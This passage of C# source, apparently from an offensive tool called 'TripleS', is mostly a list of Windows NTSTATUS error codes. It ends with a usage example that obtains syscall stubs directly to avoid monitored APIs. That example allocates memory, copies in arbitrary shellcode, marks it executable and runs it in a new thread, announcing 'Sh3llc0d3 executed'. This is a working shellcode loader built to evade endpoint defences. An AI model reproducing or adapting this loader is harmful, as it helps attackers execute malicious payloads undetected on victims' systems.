        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InsufficientResources = 0xc000009a,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        ProcessIsTerminating = 0xc000010a,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        InvalidAddress = 0xc0000141,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,

        MaximumNtStatus = 0xffffffff
    }

    // ---code for usage example---
    public static void UsageExample(byte[] ShellcodeBytes) {
        Console.WriteLine("[TripleS Usage Example Started!]");
        Console.WriteLine("[*] Getting Required Syscalls...");
        IntPtr pNTAVM = StealSyscallStubSilently("NtAllocateVirtualMemory");
        IntPtr pNTPVM = StealSyscallStubSilently("NtProtectVirtualMemory");
        IntPtr pNTCTE = StealSyscallStubSilently("NtCreateThreadEx");
        ShitsForUsageExample.NTAVM fSyscallNTAVM = (ShitsForUsageExample.NTAVM)Marshal.GetDelegateForFunctionPointer(pNTAVM, typeof(ShitsForUsageExample.NTAVM));
        ShitsForUsageExample.NTPVM fSyscallNTPVM = (ShitsForUsageExample.NTPVM)Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(ShitsForUsageExample.NTPVM));
        ShitsForUsageExample.NTCTE fSyscallNTCTE = (ShitsForUsageExample.NTCTE)Marshal.GetDelegateForFunctionPointer(pNTCTE, typeof(ShitsForUsageExample.NTCTE));
        IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        UInt32 AllocationType = (UInt32)ShitsForUsageExample.AllocationType.Commit | (UInt32)ShitsForUsageExample.AllocationType.Reserve;
        Console.WriteLine("[*] Allocating memory...");
        fSyscallNTAVM(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationType, PAGE_READWRITE);
        Console.WriteLine("[*] Copying Shellcode...");
        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
        Console.WriteLine("[*] Changing memory protection setting...");
        UInt32 newProtect = 0;
        fSyscallNTPVM(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, PAGE_EXECUTE_READ, ref newProtect);
        IntPtr threadHandle = new IntPtr(0);
        ShitsForUsageExample.ACCESS_MASK desiredAccess = ShitsForUsageExample.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ShitsForUsageExample.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
        IntPtr pObjectAttributes = new IntPtr(0);
        IntPtr lpParameter = new IntPtr(0);
        bool bCreateSuspended = false;
        int stackZeroBits = 0;
        int sizeOfStackCommit = 0xFFFF;
        int sizeOfStackReserve = 0xFFFF;
        IntPtr pBytesBuffer = new IntPtr(0);
        // create new thread
        Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
        fSyscallNTCTE(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
        Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
        // free syscall stub
        Marshal.FreeHGlobal(pNTAVM);
        Marshal.FreeHGlobal(pNTPVM);
        Marshal.FreeHGlobal(pNTCTE);
    }
    // ---code for usage example--- 
}